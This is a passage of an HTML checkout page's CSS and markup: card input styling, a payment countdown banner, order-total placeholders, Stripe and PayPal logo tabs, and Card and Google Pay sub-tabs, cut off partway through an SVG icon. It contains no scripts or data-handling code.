  font-size: 0.95rem;
  color: #1f2937;
  outline: none;
  transition: border-color 0.2s;
  background: #ffffff;
}

.checkout-input::placeholder {
  color: #9ca3af;
}

.checkout-input:focus {
  border-color: #2563eb;
  box-shadow: 0 0 0 1px #2563eb;
}

.card-brand-icons {
  position: absolute;
  right: 0.75rem;
  top: 50%;
  transform: translateY(-50%);
  display: flex;
  gap: 0.25rem;
  align-items: center;
}

.card-brand-icon {
  height: 18px;
  border-radius: 2px;
}

/* Form Row for Exp and CVV */
.form-row-2col {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1rem;
}

/* Form Row for Card number, Exp and CVV on same line */
.form-row-3col {
  display: grid;
  grid-template-columns: 2fr 1fr 1fr;
  gap: 1rem;
  margin-bottom: 1.25rem;
}

.form-row-3col .checkout-input-group {
  margin-bottom: 0;
}

/* Google Pay Instruction Box */
.gpay-instruction-box {
  display: flex;
  align-items: center;
  gap: 1rem;
  padding: 1.25rem;
  border: 1px solid #d1d5db;
  border-radius: 6px;
  background-color: #ffffff;
  color: #6b7280;
  font-size: 0.9rem;
  margin-bottom: 2.5rem;
}

.gpay-instruction-icon {
  flex-shrink: 0;
  width: 24px;
  height: 24px;
  color: #9ca3af;
}

.gpay-instruction-text {
  line-height: 1.4;
}

/* Action button area */
.checkout-actions {
  margin-top: 2rem;
}

.pay-now-submit-btn {
  width: 100%;
  max-width: 160px;
  padding: 0.8rem;
  font-size: 0.95rem;
  font-weight: 600;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  text-align: center;
  transition: background-color 0.2s;
}

/* Custom button states from screenshots */
.pay-now-submit-btn.card-style {
  background-color: #a5b4fc; /* inactive light indigo/blue */
  color: #ffffff;
  cursor: not-allowed;
  opacity: 0.8;
  transition: all 0.2s;
}

.pay-now-submit-btn.card-style:hover {
  background-color: #818cf8;
}

/* Active solid blue state when all card info is valid */
.pay-now-submit-btn.card-style.active-state {
  background-color: #0052ff; /* bright blue */
  opacity: 1;
  cursor: pointer;
}

.pay-now-submit-btn.card-style.active-state:hover {
  background-color: #0040c7;
}

.pay-now-submit-btn.gpay-style {
  background-color: #2563eb; /* solid dark blue as in screenshot */
  color: #ffffff;
  max-width: 160px;
}

.pay-now-submit-btn.gpay-style:hover {
  background-color: #1d4ed8;
}

/* General Link Dropdown Content (Mock Toggle) */
.details-collapse-content {
  display: none;
  margin-top: 1rem;
  background: #f9fafb;
  border: 1px solid #e5e7eb;
  border-radius: 6px;
  padding: 1rem;
  font-size: 0.85rem;
  color: #4b5563;
}

.details-collapse-content.active {
  display: block;
}

.details-row {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.5rem;
}

.details-row:last-child {
  margin-bottom: 0;
  padding-top: 0.5rem;
  border-top: 1px dashed #e5e7eb;
  font-weight: 600;
}

/* Card Validation Error Styling */
.checkout-input.error-state {
  border-color: #ef4444 !important;
  color: #ef4444 !important;
}

.checkout-input.error-state:focus {
  box-shadow: 0 0 0 1px #ef4444 !important;
}

.card-error-message {
  color: #ef4444;
  font-size: 0.82rem;
  font-weight: 500;
  margin-top: 0.35rem;
  text-align: left;
}

</style>
</head>
<body class="checkout-body">

  <div class="checkout-wrapper">
    <!-- Countdown Timer Banner -->
    <div class="countdown-container">
      Payment must be submitted within <span id="countdown-timer" class="countdown-time">120:00</span>, or your order will be cancelled.
    </div>

    <!-- Order Header Row -->
    <div class="order-header-row">
      <div class="order-info-left">
        <span class="order-number" id="order-number-display">Order No: LOADING...</span>
        <a class="payment-details-dropdown" id="toggle-details-btn">
          Payment details 
          <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-left: 2px;">
            <path d="M1 1L5 5L9 1" stroke="#6B7280" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </a>
      </div>
      <div class="order-total-box">
        Total:<span class="order-total-amount" id="order-total-display">$0.00</span> dollars
      </div>
    </div>

    <!-- Collapsible Details Box -->
    <div class="details-collapse-content" id="details-collapse">
      <div class="details-row">
        <span id="product-name-detail">Product Name</span>
        <span id="product-price-detail">$0.00</span>
      </div>
      <div class="details-row">
        <span>Quantity</span>
        <span>1</span>
      </div>
      <div class="details-row">
        <span>Delivery Address</span>
        <span id="customer-email-detail">email@domain.com</span>
      </div>
    </div>

    <!-- Payment Methods Row -->
    <div class="payment-methods-row">
      <span class="payment-methods-label">Payment methods:</span>
      <div class="method-tabs">
        <div class="method-tab stripe active" id="stripe-method-tab">
          <img src="data:image/png;base64,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" alt="Stripe" class="payment-method-logo stripe-logo">
        </div>
        <div class="method-tab paypal" id="paypal-method-tab">
          <img src="data:image/png;base64,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" alt="PayPal" class="payment-method-logo paypal-logo">
        </div>
      </div>
    </div>

    <!-- Main Payment Details Area -->
    <div id="stripe-payment-section">
      <!-- Sub Tabs: Card vs Google Pay -->
      <div class="sub-tabs-container">
        <!-- Card Tab -->
        <div class="sub-tab card-tab active" id="sub-tab-card">
          <span class="sub-tab-icon">
            <svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path fill-rule="evenodd" clip-rule="evenodd" d="M2 0h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z M0 4h20v3H0V4z M3 10h4v3H3v-3z" fill="currentColor"/>
            </svg>
          </span>
          <span class="sub-tab-label">Card</span>
        </div>
        <!-- Google Pay Tab -->
        <div class="sub-tab gpay-tab" id="sub-tab-gpay">
          <span class="sub-tab-icon">
            <svg width="40" height="20" viewBox="0 0 40 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="0.5" y="0.5" width="39" height="19" rx="4" fill="white" stroke="#D1D5DB"/>
              <g transform="translate(7, 0)">
                <path d="M10.5 10c0-.37-.03-.72-.1-1.05H6v2h2.56a2.2 2.2 0 0 1-.96 1.44v1.2h1.55c.9-.83 1.41-2.06 1.41-3.59z" fill="#4285F4"/>
                <path d="M6 14.5c1.24 0 2.28-.41 3.04-1.12l-1.55-1.2c-.43.29-.98.46-1.49.46-1.15 0-2.13-.78-2.48-1.81H2.03v1.24A6.5 6.5 0 0 0 6 14.5z" fill="#34A853"/>
                <path d="M3.52 10.83a3.9 3.9 0 0 1 0-2.5V7.09H2.03a6.5 6.5 0 0 0 0 5.82l1.49-1.24v-.84z" fill="#FBBC05"/>
                <path d="M6 5.67c.68 0 1.28.23 1.76.69l1.32-1.32A6.5 6.5 0 0 0 6 3.5a6.5 6.5 0 0 0-3.97 1.35l1.49 1.24c.35-1.03 1.33-1.81 2.48-1.81z" fill="#EA4335"/>
                <path d="M13.5 6.5h1.8c.4 0 .7.1.9.3.2.2.3.4.3.7s-.1.5-.3.7c-.2.2-.5.3-.9.3h-.9v2h-1v-4zm1 1.3h.8c.2 0 .3 0 .4-.1.1-.1.1-.2.1-.3s0-.2-.1-.3c-.1-.1-.2-.1-.4-.1h-.8v.8z" fill="#5F6368"/>
                <path d="M18.2 8.5c0-.4.3-.6.8-.6.4 0 .6.2.6.5v2.1h-.9v-.3c-.1.2-.4.4-.7.4-.3 0-.5-.1-.7-.3a1 1 0 0 1-.2-.6c0-.4.3-.6.8-.6h.7c0-.2-.1-.3-.2-.4a.5.5 0 0 0-.4-.1.5.5 0 0 0-.4.1.7.7 0 0 0-.2.3l-.8-.2c.1-.3.3-.5.6-.6.3-.1.6-.2 1-.2.5 0 .8.1 1 .3.2.2.3.5.3.9v1.9h-1v-.3l-.3.3c-.2.1-.4.2-.6.2a1 1 0 0 1-.7-.2c-.2-.1-.2-.3-.2-.5zm1.4.3h-.5c-.2 0-.3.1-.3.3s.1.2.3.2c.2 0 .4-.1.5-.3v-.2z" fill="#5F6368"/>
